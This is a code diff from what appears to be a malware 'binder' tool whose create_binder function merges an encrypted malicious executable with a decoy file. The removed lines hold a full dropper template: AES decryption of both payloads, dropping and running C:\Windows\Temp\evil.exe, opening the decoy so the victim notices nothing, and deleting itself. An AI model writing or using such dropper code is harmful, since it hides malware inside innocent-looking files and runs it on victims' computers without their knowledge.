@@ -59,41 +59,7 @@ def create_binder(evil_file, normal_file, binder_file, key):
         lines = f.readlines()
         iv_normal = lines[0].split(': ')[1].strip()
         data_normal = lines[1].split(': ')[1].strip()
-    code = """
-    import base64
-    import hashlib
-    import subprocess
-    import os
-    import shutil
-    import sys
-    from Crypto.Cipher import AES
-    from Crypto.Random import get_random_bytes
-    from cryptography.hazmat.backends import default_backend
-    from Crypto.Util.Padding import unpad
-
-    def decrypt_data(iv, data, key):
-        expanded_key = bytearray(hashlib.sha256(key).digest())
-        expanded_key.extend(b'\x00' * (16 - len(expanded_key)))
-        expanded_key = bytes(expanded_key)
-
-        cipher = AES.new(expanded_key, AES.MODE_CBC, iv=iv)
-        dec_data = cipher.decrypt(data)
-        return unpad(dec_data, 16)
-    iv_evil = base64.b64decode('{}')
-    data_evil = base64.b64decode('{}')
-    iv_normal = base64.b64decode('{}')
-    data_normal = base64.b64decode('{}')
-    key = b'{}'
-    dec_data_evil = decrypt_data(iv_evil, data_evil, key)
-    dec_data_normal = decrypt_data(iv_normal, data_normal, key)
-    with open('evil.txt', 'wb') as f:
-        f.write(dec_data_evil)
-    with open('{}', 'wb') as f:
-        f.write(dec_data_normal)
-    shutil.move('evil.txt','C:\Windows\Temp\evil.exe')
-    subprocess.call(['C:\Windows\Temp\evil.exe'])
-    os.startfile('{}')
-    os.remove(sys.argv[0])""".format(iv_evil,data_evil,iv_normal,data_normal,key,normal_file,normal_file)
+    
 
 # 生成绑定文件
     with open(binder_file, 'w') as f:
